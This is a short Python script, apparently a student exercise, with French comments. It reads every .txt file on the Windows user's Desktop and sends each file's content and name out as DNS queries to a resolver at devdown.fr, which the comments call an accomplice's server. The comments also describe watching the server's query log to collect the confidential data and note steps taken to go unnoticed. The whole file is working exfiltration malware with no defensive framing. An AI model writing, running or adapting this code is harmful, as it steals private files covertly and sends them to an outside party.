#!/usr/bin/env python
#coding: utf-8

#############################################
#                                           #
#               TP_PYTHON                   #
#                                           #
#       author: Marion Nourrisset           #
#                                           #
#############################################


import socket , os                                                  #Import des différents modules
import dns.resolver


#Definition d'une variable globale
global desktop_path
desktop_path = os.path.join(os.environ["HOMEPATH"], "Desktop")


##Setting up DNS resolver through devdown.fr
def setting_dns():
    ip_hack = socket.gethostbyname('devdown.fr')                    #Je recupere l'ip du complice hebergeant la zone dns
    r = dns.resolver.Resolver(configure=False)                      #Creation de la variable r comme dns
    r.nameservers = [ip_hack]                                       #Configuration du dns avec l'ip complice
    r.timeout = 1                                                   #Configuration du timeout...
    r.lifetime = 1                                                  #...et lifetime pour un script plus rapide
    return r


##Finding Brevet files and creating a list
def finding_brevet():
    desktop_files = os.listdir(desktop_path)                        #Liste de tous les fichiers presents sur le bureau
    file_list = []                                                  #creation d'une liste vide
    for names in desktop_files:
        if names.endswith(".txt"):                                  #Filtrage des fichiers .txt...
            file_list.append(names)                                 #pour les incrementer dans la liste
    return file_list


##Lecture des fichiers brevet et envoi de leur contenu et nom via une requete dns
##Le complice n'a qu'a surveiller le fichier /var/log/dns/query.log
##pour voir apparaitre les informations confidentielles
def main():
    for file in finding_brevet():                                   #Creation d'une boucle avec tous les fichiers .txt
        try:
            brevet = open(desktop_path + "/" + file, "r")           #Ouverture du fichier
            data = (brevet.read() + "_" + file).replace(' ', '_')   #La donnee envoyee correspond au contenu et au nom du fichier
            brevet.close()                                          #Fermeture du fichier pour passer inapercu
            setting_dns().query(data)                               #Creation d'une requete dns avec le serveur du complice et les donnees
        except:
            pass                                                    #Bien que le nom ne soit pas resolu le script continu


main()
